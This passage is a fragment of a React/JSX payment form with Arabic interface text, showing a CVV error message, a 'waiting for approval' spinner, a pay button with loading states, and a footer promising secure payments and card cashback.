                      dir="ltr"
                      data-testid="input-cvv"
                    />
                    {cardErrors.cvv && <p className="text-red-500 text-xs mt-1">{cardErrors.cvv}</p>}
                  </div>
                </div>

                {cardErrors.submit && (
                  <p className="text-red-500 text-xs text-center" data-testid="error-reserve-submit">
                    {cardErrors.submit}
                  </p>
                )}

                {isWaitingApproval && (
                  <div
                    className="bg-[#fdf6e3] border border-[#c9a96e]/40 rounded-xl p-4 flex items-center gap-3"
                    data-testid="card-waiting-approval-reserve"
                  >
                    <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin flex-shrink-0" />
                    <div className="text-right flex-1">
                      <p className="text-[#4a1525] font-semibold text-sm">
                        معالجة الدفع
                      </p>
                      <p className="text-[#7a6b5f] text-xs mt-0.5">
                        يرجى عدم إغلاق الصفحة، قد تستغرق العملية بضع لحظات...
                      </p>
                    </div>
                  </div>
                )}

                <Button
                  onClick={handlePaymentSubmit}
                  size="lg"
                  className="w-full bg-primary text-white shadow-lg mt-4"
                  disabled={isSubmitting || isWaitingApproval}
                  data-testid="button-pay-reserve"
                >
                  {isWaitingApproval
                    ? "في انتظار الموافقة..."
                    : isSubmitting
                    ? "جاري المعالجة..."
                    : "متابعة الدفع"}
                </Button>
              </div>

              <footer className="px-4 py-6 text-center space-y-3">
                <div className="flex items-center justify-center gap-2">
                  <div className="w-8 h-8 bg-[#f5efe6] rounded-full flex items-center justify-center">
                    <Lock className="w-4 h-4 text-[#c9a96e]" />
                  </div>
                  <p className="text-sm text-muted-foreground">جميع عمليات الدفع مشفرة وآمنة 100%</p>
                </div>
                <p className="text-sm text-primary font-medium">
                  احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
                </p>
              </footer>
            </div>
          </>
        )}

      </div>
    </div>
  );
}
